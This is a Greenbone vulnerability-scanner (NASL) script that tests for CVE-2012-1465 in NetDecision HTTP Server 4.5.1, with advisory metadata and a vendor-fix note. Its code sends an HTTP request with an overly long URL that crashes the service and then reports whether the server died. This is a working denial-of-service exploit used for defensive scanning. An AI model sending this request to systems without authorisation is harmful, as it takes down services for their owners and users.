# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802617");
  script_version("2024-06-27T05:05:29+0000");
  script_cve_id("CVE-2012-1465");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-03-08 15:19:34 +0530 (Thu, 08 Mar 2012)");
  script_name("NetDecision HTTP Server Long HTTP Request Remote DoS Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48168/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52208");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18541/");
  script_xref(name:"URL", value:"http://www.netmechanica.com/news/?news_id=26");
  script_xref(name:"URL", value:"http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("NetDecision-HTTP-Server/banner");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Netmechanica NetDecision 4.5.1.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error in the HTTP server when handling
  web requests can be exploited to cause a stack-based buffer overflow via an
  overly-long URL.");

  script_tag(name:"solution", value:"Upgrade to Netmechanica NetDecision 4.6.1 or later.");

  script_tag(name:"summary", value:"NetDecision HTTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: NetDecision-HTTP-Server" >!< banner)
  exit(0);

if(http_is_dead(port:port))
  exit(0);

req = http_get(item:string("/", crap(1276)), port:port);
http_send_recv(port:port, data:req);
sleep(3);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
